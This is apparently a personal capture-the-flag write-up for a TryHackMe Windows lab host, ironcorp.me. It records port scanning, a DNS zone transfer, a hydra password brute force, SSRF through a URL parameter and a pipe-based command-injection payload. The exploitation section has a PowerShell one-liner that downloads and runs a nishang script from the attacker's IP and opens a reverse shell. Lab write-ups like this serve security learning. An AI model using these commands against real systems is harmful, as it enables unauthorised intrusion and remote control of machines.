```
target:10.10.110.80
OS:windows
rate:Hard
platform:THM
domain:ironcorp.me
```


# scanning
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/CORP-THM]                                                                                                                                                                                             
└─$ cat nmap.txt                                                                                                                                                                                                                              
# Nmap 7.94SVN scan initiated Tue Feb 20 23:30:10 2024 as: nmap -sC -Pn -sV -oN nmap.txt -vvv -p 53,135,3389,8080,11025,49670,49667 10.10.110.80
Nmap scan report for ironcorp.me (10.10.110.80)
Host is up, received user-set (0.20s latency).
Scanned at 2024-02-20 23:30:10 EST for 71s
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack (generic dns response: SERVFAIL)
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
8080/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
|_http-server-header: Microsoft-IIS/10.0
11025/tcp open  http          syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
|_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC 
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC 

```


# enumeration
```
# Dashtreme - Multipurpose Bootstrap5 Admin Template

Dashtreme is a fully responsive Bootstrap 5 admin dashboard template. It is built with the Bootstrap 5 frameworks, HTML5, CSS, and JQuery. It works on all major web browsers, desktops, and all smartphone devices. It is a very easy-to-customize and developer-friendly template. It has a vast collection of UI components with the latest jQuery and Bootstrap plugins. It can be used for any type of web application eCommerce dashboard, custom admin panel, project management admin, CRM, CMS, etc.



#enumerating port 8080 on ironcorp.me
is running  a default(demo) dashtreme for an admin


#enumerating port 3389
it is a port showing that the default user on the server is part of the remote management group, so remote access is possible


#enumerating port 11025
nothing of interest than this(http://ironcorp.me:11025/)


CHECKING FOR ZONE TRANSFER
tool:
1. subrake -d ironcorp.me
2. dig @10.10.110.80 ironcorp.me axfr

OUTPUT:(subdomain)
1. internal.ironcorp.me
2. admin.ironcorp.me

NB: we add this to our hosts so as we can access them


#enumerating admin.ironcorp.me or port 8080 and 11025
11025 login page(no credentials): test later

#enumerating internal.ironcorp.me on port 8080 and 11025
11025 = we have no permission to access this 
```

# foothold
```
#admin.ironcorp.me:11025 (bruteforcing)

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/CORP-THM]
└─$ hydra -l admin -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -s 11025 -f admin.ironcorp.me http-get /
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-20 23:47:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 197 login tries (l:1/p:197), ~13 tries per task
[DATA] attacking http-get://admin.ironcorp.me:11025/
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
[STATUS] attack finished for admin.ironcorp.me (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-20 23:47:13


credentials:
username:admin
password:password123

TESTING COMMAND INJECTION AND SSRF
http://admin.ironcorp.me:11025/?r=http://10.8.58.50:82/ (vulnelable to SSRF)

NB: http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/ ( we can use this SSRF method to access the internal network i.e internal.ironcorp.me:11025)

another note:
http://internal.ironcorp.me:11025/name.php?name=


**My name is:Equinox**
username: Equinox (test later)

TESTING FOR COMMAND INJECTION
http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test::dir


http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test|dir(worked)

```


# exploitation
```
NB:since it is a windows box we can use powershell script from nishang

powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.8.58.50:82/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.58.50 -Port 1234

NB:encoded payload

PS C:\Users\Administrator\Desktop> type user.txt

```


# privilege escalation
```
PS C:\Users\Administrator\Desktop> whoami
nt authority\system
PS C:\Users\Administrator\Desktop> 


NB: we are already NT authority\system


```